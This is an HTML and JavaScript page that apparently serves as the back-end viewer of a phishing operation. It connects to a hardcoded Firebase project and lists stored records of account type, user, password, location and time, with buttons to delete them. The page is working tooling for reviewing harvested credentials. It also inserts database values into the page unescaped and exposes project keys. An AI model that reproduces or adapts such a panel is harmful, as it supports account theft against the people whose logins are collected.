<!DOCTYPE html>
<html>
<head>
  <title>Database</title>
  <style>
    /* Add your CSS styles here */
    body {
      font-family: Arial, sans-serif;
    }
    #save {
      margin-top: 20px;
    }
    .canvaschat {
      padding: 10px;
      border: 1px solid #ccc;
      margin-bottom: 10px;
      background-color: #f5f5f5;
    }
    .send {
      background-color: #e74c3c;
      color: white;
      border: none;
      padding: 5px 10px;
      cursor: pointer;
    }
    .send:hover {
      background-color: #c0392b;
    }
  </style>
</head>
<body>
  <div></div>
  <div id="save"></div>

  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>

  <script>
const firebaseConfig = {
  apiKey: "AIzaSyDhn80byD69jCo4oexdKdkCHUgGw9nO6CM",
  authDomain: "dubai4db.firebaseapp.com",
  databaseURL: "https://dubai4db-default-rtdb.firebaseio.com",
  projectId: "dubai4db",
  storageBucket: "dubai4db.appspot.com",
  messagingSenderId: "776520121975",
  appId: "1:776520121975:web:248815949672b2c4371072"
};

    firebase.initializeApp(firebaseConfig);
    firebase.auth().signInAnonymously().catch(function(error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

    firebase.database().ref("fbdet").on("child_added", function(snapshot) {
      var html = "";
      html += "<div class='canvaschat'>";
      html += "<hr>";
      html += "<p><b>Account type:</b> " + snapshot.val().type + "</p>";
      html += "<p><b>User:</b> " + snapshot.val().emle + "</p>";
      html += "<p><b>Password:</b> " + snapshot.val().pass + "</p>";
      html += "<p><b>Date:</b> " + snapshot.val().date + "</p>";
      html += "<p><b>Location:</b> " + snapshot.val().timezone + "</p>";
      html += "<p><b>Time:</b> " + snapshot.val().time + "</p>";
      html += "<button data-id='" + snapshot.key + "' onclick='deleteMessage(this);' class='send'>Delete</button>";
      html += "</div>";
      document.getElementById("save").innerHTML += html;
    });

    function deleteMessage(self) {
      var messageId = self.getAttribute("data-id");
      firebase.database().ref("fbdet").child(messageId).remove();
    }

    firebase.database().ref("fbdet").on("child_removed", function(snapshot) {
      var messageElement = document.getElementById("message-" + snapshot.key);
      if (messageElement) {
        messageElement.innerHTML = "Deleted";
      }
    });
  </script>
</body>
</html>
